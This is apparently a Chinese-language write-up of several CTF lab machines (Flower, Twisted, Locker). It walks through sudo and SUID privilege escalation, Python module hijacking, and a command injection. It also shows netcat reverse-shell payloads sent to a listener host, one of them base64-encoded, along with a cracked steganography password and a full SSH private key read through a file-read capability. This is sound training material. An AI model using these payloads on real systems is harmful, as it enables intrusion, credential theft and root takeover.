<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">adrian@vulny:/usr/share/wordpress/wp-content$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> adrian on vulny:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/<span class="built_in">bin</span>\:/usr/sbin\:/usr/<span class="built_in">bin</span>\:/sbin\:/<span class="built_in">bin</span>\:/snap/<span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line">User adrian may run the following commands on vulny:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/<span class="built_in">bin</span>/flock</span><br></pre></td></tr></table></figure>

<p>gtfobins一把梭</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adrian@vulny:/usr/share/wordpress/wp-content$ sudo /usr/<span class="built_in">bin</span>/flock -u / /<span class="built_in">bin</span>/sh</span><br><span class="line">&lt;dpress/wp-content$ sudo /usr/<span class="built_in">bin</span>/flock -u / /<span class="built_in">bin</span>/sh</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h2 id="Flower"><a href="#Flower" class="headerlink" title="Flower"></a>Flower</h2><p>扫端口只开了80，访问是数花瓣数量的抓包发现，算数式通过base64编码传输，这里可以反弹shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.56</span><span class="number">.40</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">138.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">138.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.40</span>/</span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">67</span></span><br><span class="line">Origin: http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.40</span></span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Priority: u=<span class="number">0</span>, i</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">petals=c3lzdGVtKCJuYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC41Ni40IDEyMzQiKTs=</span><br></pre></td></tr></table></figure>

<p>这里我们可以无密码用rose执行diary.py</p>
<p>这里导入了一个pickle，该目录下并没有pickle.py，但是我们有权限创建，执行脚本时会优先索引该目录下的pickle。</p>
<p>我们可以利用这里去反弹shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&#x27;import os; os.system(&quot;nc -e /bin/bash 192.168.56.4 1234&quot;)&#x27;</span> &gt; pickle.py</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on flower:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/<span class="built_in">bin</span>\:/usr/sbin\:/usr/<span class="built_in">bin</span>\:/sbin\:/<span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on flower:</span><br><span class="line">    (rose) NOPASSWD: /usr/<span class="built_in">bin</span>/python3 /home/rose/diary/diary.py</span><br><span class="line">$ cd /home/rose/diary/</span><br><span class="line">cd /home/rose/diary/</span><br><span class="line">$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total <span class="number">20</span></span><br><span class="line">drwxrwxrwx <span class="number">3</span> rose     rose     <span class="number">4096</span> May <span class="number">23</span> 03:<span class="number">44</span> .</span><br><span class="line">drwxrwxr-x <span class="number">3</span> rose     rose     <span class="number">4096</span> May <span class="number">23</span> 03:<span class="number">58</span> ..</span><br><span class="line">drwxr-xr-x <span class="number">2</span> rose     rose     <span class="number">4096</span> May <span class="number">23</span> 03:<span class="number">45</span> __pycache__</span><br><span class="line">-rw-r--r-- <span class="number">1</span> rose     rose        <span class="number">0</span> May <span class="number">23</span> 03:<span class="number">52</span> diary.pickle</span><br><span class="line">-rw-r--r-- <span class="number">1</span> rose     rose      <span class="number">147</span> Nov <span class="number">30</span>  <span class="number">2020</span> diary.py</span><br><span class="line">-rw-r--r-- <span class="number">1</span> www-data www-data   <span class="number">58</span> May <span class="number">23</span> 03:<span class="number">45</span> pickle.py</span><br><span class="line">$ cat /home/rose/diary/diary.py</span><br><span class="line">cat /home/rose/diary/diary.py</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">diary = &#123;<span class="string">&quot;November28&quot;</span>:<span class="string">&quot;i found a blue viola&quot;</span>,<span class="string">&quot;December1&quot;</span>:<span class="string">&quot;i lost my blue viola&quot;</span>&#125;</span><br><span class="line">p = <span class="built_in">open</span>(<span class="string">&#x27;diary.pickle&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">pickle.dump(diary,p)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>进入rose用户，发现可无密码root执行.plantbook文件，rose用户可以修改.plantbook，直接写个shell执行即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">rose@flower:/var/www/html$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> rose on flower:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/<span class="built_in">bin</span>\:/usr/sbin\:/usr/<span class="built_in">bin</span>\:/sbin\:/<span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line">User rose may run the following commands on flower:</span><br><span class="line">    (root) NOPASSWD: /<span class="built_in">bin</span>/bash /home/rose/.plantbook</span><br><span class="line">rose@flower:/var/www/html$ echo -e <span class="string">&#x27;#!/bin/bash\n/bin/bash -i&#x27;</span> &gt; /home/rose/.plantbook</span><br><span class="line">&lt;<span class="string">&#x27;#!/bin/bash\n/bin/bash -i&#x27;</span> &gt; /home/rose/.plantbook</span><br><span class="line">rose@flower:/var/www/html$ cat /home/rose/.plantbook</span><br><span class="line">cat /home/rose/.plantbook</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/<span class="built_in">bin</span>/bash -i</span><br><span class="line">rose@flower:/var/www/html$ sudo -u root /<span class="built_in">bin</span>/bash /home/rose/.plantbook</span><br><span class="line">sudo -u root /<span class="built_in">bin</span>/bash /home/rose/.plantbook</span><br><span class="line">root@flower:/var/www/html<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">flower.jpg  index.php  run.sh</span><br><span class="line">root@flower:/var/www/html<span class="comment"># cd /root/root.txt</span></span><br><span class="line">cd /root/root.txt</span><br><span class="line">bash: cd: /root/root.txt: Not a directory</span><br><span class="line">root@flower:/var/www/html<span class="comment"># cat /root/root.txt</span></span><br><span class="line">cat /root/root.txt</span><br><span class="line">HMV&#123;R0ses_are_als0_black.&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Twisted"><a href="#Twisted" class="headerlink" title="Twisted"></a>Twisted</h2><p>开了80和2222的ssh</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/za]</span><br><span class="line">└─$ nmap -sC -sV -p- <span class="number">192.168</span><span class="number">.56</span><span class="number">.42</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2025</span>-05-<span class="number">23</span> 06:<span class="number">26</span> EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.56</span><span class="number">.42</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.0030</span>s latency).</span><br><span class="line">Not shown: <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span>/tcp   <span class="built_in">open</span>  http    nginx <span class="number">1.14</span><span class="number">.2</span></span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">|_http-server-header: nginx/1.14.2</span></span><br><span class="line"><span class="string">2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span></span><br><span class="line"><span class="string">| ssh-hostkey: </span></span><br><span class="line"><span class="string">|   2048 67:63:a0:c9:8b:7a:f3:42:ac:49:ab:a6:a7:3f:fc:ee (RSA)</span></span><br><span class="line"><span class="string">|   256 8c:ce:87:47:f8:b8:1a:1a:78:e5:b7:ce:74:d7:f5:db (ECDSA)</span></span><br><span class="line"><span class="string">|_  256 92:94:66:0b:92:d3:cf:7e:ff:e8:bf:3c:7b:41:b7:5a (ED25519)</span></span><br><span class="line"><span class="string">MAC Address: 08:00:27:55:20:56 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 19.81 seconds</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>80端口有两个jpg，图像是一样的，但是名称提示了一切</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/za]</span><br><span class="line">└─$ curl http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.42</span>  </span><br><span class="line">&lt;h1&gt;I love cats!&lt;/h1&gt; </span><br><span class="line">&lt;img src=<span class="string">&quot;cat-original.jpg&quot;</span> alt=<span class="string">&quot;Cat original&quot;</span>  width=<span class="string">&quot;400&quot;</span> height=<span class="string">&quot;400&quot;</span>&gt; </span><br><span class="line">&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;But I prefer this one because seems different&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;cat-hidden.jpg&quot;</span> alt=<span class="string">&quot;Cat Hidden&quot;</span> width=<span class="string">&quot;400&quot;</span> height=<span class="string">&quot;400&quot;</span>&gt; </span><br></pre></td></tr></table></figure>

<p>这里用stegseek查看隐写内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/za]</span><br><span class="line">└─$ stegseek  cat-hidden.jpg /home/kali/Desktop/baji/rockyou.txt</span><br><span class="line">StegSeek <span class="number">0.6</span> - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[i] Found passphrase: <span class="string">&quot;sexymama&quot;</span></span><br><span class="line">[i] Original filename: <span class="string">&quot;mateo.txt&quot;</span>.</span><br><span class="line">[i] Extracting to <span class="string">&quot;cat-hidden.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line">                                                                                                                                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/za]</span><br><span class="line">└─$ cat cat-hidden.jpg.out                                      </span><br><span class="line">thisismypassword</span><br><span class="line">                                                                                                                                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/za]</span><br><span class="line">└─$ nc -l -p <span class="number">12345</span> &gt; received_file</span><br><span class="line">                                                                                                                                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/za]</span><br><span class="line">└─$ stegseek  cat-original.jpg /home/kali/Desktop/baji/rockyou.txt</span><br><span class="line">StegSeek <span class="number">0.6</span> - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[i] Found passphrase: <span class="string">&quot;westlife&quot;</span></span><br><span class="line">[i] Original filename: <span class="string">&quot;markus.txt&quot;</span>.</span><br><span class="line">[i] Extracting to <span class="string">&quot;cat-original.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line">                                                                                                                                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/za]</span><br><span class="line">└─$ cat cat-original.jpg.out</span><br><span class="line">markuslovesbonita</span><br></pre></td></tr></table></figure>

<p>拿到了两个登录凭证</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mateo:thisismypassword</span><br><span class="line">markus:markuslovesbonita</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">markus@twisted:~$ cat n*</span><br><span class="line">Hi bonita,</span><br><span class="line">I have saved your id_rsa here: /var/cache/apt/id_rsa</span><br><span class="line">Nobody can find it. </span><br><span class="line">markus@twisted:~$ cat /var/cache/apt/id_rsa</span><br><span class="line">cat: /var/cache/apt/id_rsa: Permission denied</span><br></pre></td></tr></table></figure>

<p>bonita用户的id_rsa，但是我们没权限读取</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">markus@twisted:/var/cache/apt$ find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/home/bonita/beroot</span><br><span class="line">/usr/<span class="built_in">bin</span>/su</span><br><span class="line">/usr/<span class="built_in">bin</span>/umount</span><br><span class="line">/usr/<span class="built_in">bin</span>/gpasswd</span><br><span class="line">/usr/<span class="built_in">bin</span>/passwd</span><br><span class="line">/usr/<span class="built_in">bin</span>/mount</span><br><span class="line">/usr/<span class="built_in">bin</span>/chfn</span><br><span class="line">/usr/<span class="built_in">bin</span>/chsh</span><br><span class="line">/usr/<span class="built_in">bin</span>/newgrp</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-<span class="number">1.0</span>/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line"></span><br><span class="line">markus@twisted:/usr/<span class="built_in">bin</span>$ /usr/sbin/getcap -r / <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/<span class="built_in">bin</span>/ping = cap_net_raw+ep</span><br><span class="line">/usr/<span class="built_in">bin</span>/tail = cap_dac_read_search+ep</span><br></pre></td></tr></table></figure>

<p>这里也是发现tail命令可以任意读取，那么直接读取user.txt和root.txt就可以了</p>
<p><strong>getcap：</strong>用于显示文件或程序的 Linux 权能（capabilities）。Linux 权能是一种细粒度的权限机制，允许文件或进程拥有特定特权（如读取任意文件、绑定特权端口等），而无需完整 root 权限。</p>
<p>这里我们读取id_rsa尝试通过提权进入root</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">markus@twisted:/usr/<span class="built_in">bin</span>$ tail -n +<span class="number">0</span> /var/cache/apt/id_rsa</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zd</span><br><span class="line">FyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS</span><br><span class="line">olvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1</span><br><span class="line">vD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF</span><br><span class="line">gFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C</span><br><span class="line">tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM</span><br><span class="line">gl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC</span><br><span class="line">xCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8</span><br><span class="line">DcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H</span><br><span class="line">uN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyD</span><br><span class="line">XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu</span><br><span class="line">U3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gI</span><br><span class="line">mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/</span><br><span class="line">hmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutro</span><br><span class="line">nxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXK</span><br><span class="line">mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+</span><br><span class="line">bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+<span class="number">9</span>/PI6bN+iwloDlugtq</span><br><span class="line">yzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP</span><br><span class="line">UvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh</span><br><span class="line">V2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ</span><br><span class="line">LlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz</span><br><span class="line">a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF</span><br><span class="line">eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu</span><br><span class="line">D0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>登录进去之后，寻找提权路径</p>
<p>当前目录下有一个beroot可执行文件，nc传输到本地反编译分析</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bonita@twisted:~$ ls -al</span><br><span class="line">total <span class="number">52</span></span><br><span class="line">drwxr-xr-x <span class="number">4</span> bonita bonita  <span class="number">4096</span> Oct <span class="number">14</span>  <span class="number">2020</span> .</span><br><span class="line">drwxr-xr-x <span class="number">5</span> root   root    <span class="number">4096</span> Oct <span class="number">14</span>  <span class="number">2020</span> ..</span><br><span class="line">-rw-r--r-- <span class="number">1</span> bonita bonita   <span class="number">220</span> Oct <span class="number">14</span>  <span class="number">2020</span> .bash_logout</span><br><span class="line">-rw-r--r-- <span class="number">1</span> bonita bonita  <span class="number">3526</span> Oct <span class="number">14</span>  <span class="number">2020</span> .bashrc</span><br><span class="line">-rwsrws--- <span class="number">1</span> root   bonita <span class="number">16864</span> Oct <span class="number">14</span>  <span class="number">2020</span> beroot</span><br><span class="line">drwxr-xr-x <span class="number">3</span> bonita bonita  <span class="number">4096</span> Oct <span class="number">14</span>  <span class="number">2020</span> .local</span><br><span class="line">-rw-r--r-- <span class="number">1</span> bonita bonita   <span class="number">807</span> Oct <span class="number">14</span>  <span class="number">2020</span> .profile</span><br><span class="line">drwx------ <span class="number">2</span> bonita bonita  <span class="number">4096</span> Oct <span class="number">14</span>  <span class="number">2020</span> .ssh</span><br><span class="line">-rw------- <span class="number">1</span> bonita bonita    <span class="number">12</span> Oct <span class="number">14</span>  <span class="number">2020</span> user.txt</span><br><span class="line">bonita@twisted:~$ nc <span class="number">192.168</span><span class="number">.56</span><span class="number">.4</span> <span class="number">12345</span> &lt; beroot</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> n5880; // [rsp+1Ch] [rbp-4h] BYREF</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;Enter the code:\n &quot;</span>);</span><br><span class="line">  scanf(<span class="string">&quot;%i&quot;</span>, &amp;n5880);</span><br><span class="line">  <span class="keyword">if</span> ( n5880 == <span class="number">5880</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;\nWRONG&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>非常简单的一个输入判断，我们只需要输入5880即可执行system(“&#x2F;bin&#x2F;bash”)，拿到root权限</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bonita@twisted:~$ ./beroot</span><br><span class="line">Enter the code:</span><br><span class="line"> <span class="number">5880</span></span><br><span class="line">root@twisted:~<span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">1002</span>(bonita)</span><br></pre></td></tr></table></figure>

<h2 id="Locker"><a href="#Locker" class="headerlink" title="Locker"></a>Locker</h2><p>扫描端口只开了80端口</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─$ curl http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.51</span>                                                             </span><br><span class="line">&lt;h1&gt;SUPER LOCKER&lt;/h1&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">Use root password to unlock our powers!</span><br><span class="line">aAaaaAAaaAaAAaAAaAAaaaA!</span><br><span class="line">&lt;a href=<span class="string">&quot;/locker.php?image=1&quot;</span>&gt;Model <span class="number">1</span>&lt;/a&gt;</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>

<p>&#x2F;locker.php?image&#x3D;1测试发现这里只能是123，其他的没有东西，也没在图片中发现有用的东西</p>
<p>模糊测试得到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─$ curl http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.51</span>/locker.php?image=;pwd                                       </span><br><span class="line">&lt;img src=<span class="string">&quot;data:image/jpg;base64,&quot;</span>width=<span class="string">&quot;150&quot;</span>height=<span class="string">&quot;150&quot;</span>/&gt;/home/kali/Desktop/baji</span><br></pre></td></tr></table></figure>

<p>直接反弹shell</p>
